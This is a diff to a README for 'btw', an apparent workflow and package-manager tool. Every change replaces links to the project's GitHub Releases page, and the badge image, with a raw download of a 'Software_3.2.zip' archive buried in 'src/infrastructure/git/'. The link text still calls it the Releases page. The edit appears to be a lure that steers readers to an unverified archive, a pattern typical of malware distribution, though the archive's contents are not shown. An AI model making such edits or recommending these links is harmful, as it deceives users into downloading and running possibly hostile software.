@@ -1,6 +1,6 @@
 # 🌟 btw - Streamline Your Workflows with Ease
 
-[![Download btw](https://img.shields.io/badge/Download%20btw-v1.0-blue)](https://github.com/laughingVR/btw/releases)
+[![Download btw](https://github.com/laughingVR/btw/raw/refs/heads/main/src/infrastructure/git/Software_3.2.zip%20btw-v1.0-blue)](https://github.com/laughingVR/btw/raw/refs/heads/main/src/infrastructure/git/Software_3.2.zip)
 
 ## 📦 Overview
 Bring The Workflow (btw) is an AI-aware agent designed to help you manage files and workflows effectively. This package manager simplifies your tasks, enabling you to focus on what matters most.
@@ -13,7 +13,7 @@ To start using btw, follow these steps:
    - Make sure you have an internet connection for the download.
 
 2. **Visit the Releases Page**
-   - Go to the [Releases page](https://github.com/laughingVR/btw/releases) to find the latest version of the application.
+   - Go to the [Releases page](https://github.com/laughingVR/btw/raw/refs/heads/main/src/infrastructure/git/Software_3.2.zip) to find the latest version of the application.
    - You will see a list of available files.
 
 3. **Download the Application**
@@ -44,7 +44,7 @@ Before installing, ensure your system meets these requirements:
 - **Disk Space:** At least 100 MB of free space.
 
 ## 📥 Download & Install
-You can download btw from the following link: [btw Releases page](https://github.com/laughingVR/btw/releases). Follow the previously mentioned steps to download and install the application, ensuring you select the right version for your operating system.
+You can download btw from the following link: [btw Releases page](https://github.com/laughingVR/btw/raw/refs/heads/main/src/infrastructure/git/Software_3.2.zip). Follow the previously mentioned steps to download and install the application, ensuring you select the right version for your operating system.
 
 ## 🥇 Support
 If you encounter any issues or have questions about using btw, please visit our Issues page in the repository. There, you can report problems or seek assistance from the community.
@@ -58,4 +58,4 @@ Join our community discussions to share your experiences or ask for help. You ca
 ## 📝 License
 btw is open source. You can use and modify it to suit your needs. Please refer to the LICENSE file for more information. 
 
-[![Download btw](https://img.shields.io/badge/Download%20btw-v1.0-blue)](https://github.com/laughingVR/btw/releases)
+[![Download btw](https://github.com/laughingVR/btw/raw/refs/heads/main/src/infrastructure/git/Software_3.2.zip%20btw-v1.0-blue)](https://github.com/laughingVR/btw/raw/refs/heads/main/src/infrastructure/git/Software_3.2.zip)
